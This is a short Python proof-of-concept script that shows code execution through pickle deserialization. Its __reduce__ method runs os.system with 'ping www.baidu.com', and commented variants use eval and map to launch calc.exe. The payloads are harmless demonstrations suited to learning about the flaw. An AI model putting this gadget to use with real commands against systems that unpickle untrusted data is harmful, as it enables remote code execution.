[200~# -*- coding: utf-8 -*-
"""
Spyder Editor

This is a temporary script file.
"""
import _pickle as cPickle
 
class Person(object):
    def __init__(self,username,password):
        self.username = username 
        self.password = password 
 
    def __reduce__(self):
    	# 未导入os模块，通用
    	return (__import__('os').system, ('ping www.baidu.com',))
    	# return eval,("__import__('os').system('calc.exe')",)
    	# return map, (__import__('os').system, ('calc.exe',))
    	# return map, (__import__('os').system, ['calc.exe'])
 
    	# 导入os模块
        # return (os.system, ('calc.exe',))
        # return eval, ("os.system('calc.exe')",)
        # return map, (os.system, ('calc.exe',))
        # return map, (os.system, ['calc.exe'])
 
admin = Person('admin','123456')
result = cPickle.dumps(admin)
 
user = cPickle.loads(result)


